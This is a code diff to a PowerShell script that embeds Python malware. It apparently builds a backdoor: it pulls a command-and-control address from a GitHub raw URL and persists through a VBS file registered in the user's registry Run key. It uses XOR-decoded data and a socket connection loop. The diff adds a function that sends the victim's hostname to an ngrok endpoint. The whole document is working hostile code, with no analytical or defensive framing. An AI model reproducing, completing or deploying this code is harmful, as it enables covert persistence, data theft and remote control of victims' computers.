@@ -12,13 +12,14 @@ $PythonCode = @"
 import ctypes, base64
 import threading
 from ctypes import wintypes
-from urllib.request import urlopen
+from urllib.request import Request, urlopen
 import socket
 import time
 import os
 import winreg
 
 url = "https://raw.githubusercontent.com/gaca9302/usb/refs/heads/main/c2/c2.txt"
+name = socket.gethostname().encode("utf-8")
     
 def create_vbs(vbs_path):
     with open(vbs_path, "w", encoding="utf-8") as f:
@@ -29,6 +30,16 @@ def create_vbs(vbs_path):
     with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0,winreg.KEY_SET_VALUE) as key:
         winreg.SetValueEx(key,"Task",0,winreg.REG_SZ,r"C:\Tools\update\update.vbs")
 
+def send(name):
+    ng = "https://scarce-sullen-brilliant.ngrok-free.dev" 
+    req = Request(ng, data=name) 
+    req.add_header("Content-Type", "text/plain")
+    req.add_header("ngrok-skip-browser-warning", "1")
+    try:
+        urlopen(req)
+    except Exception as e:
+        print(f"Ошибка при отправке: {e}")
+    
 def start():
     key = b"password123"
     def xor_data(data, key):
@@ -54,6 +65,7 @@ if __name__ == "__main__":
     vbs_path = r"C:\Tools\update\update.vbs"
     if not os.path.exists(vbs_path):
         create_vbs(vbs_path)
+    send(name)
     flag = True
     while flag:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
